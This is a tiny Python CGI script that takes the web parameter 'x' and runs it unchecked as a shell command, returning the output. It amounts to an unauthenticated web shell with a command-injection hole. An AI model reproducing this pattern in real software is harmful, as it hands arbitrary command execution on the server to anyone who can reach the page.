#!/usr/bin/python3
print("content-type: text/html")
print()

# print("this is in cgi-bin")
import cgi, subprocess
form=cgi.FieldStorage()
cmd=form.getvalue("x")
op = subprocess.getstatusoutput(cmd)
print(op[1])


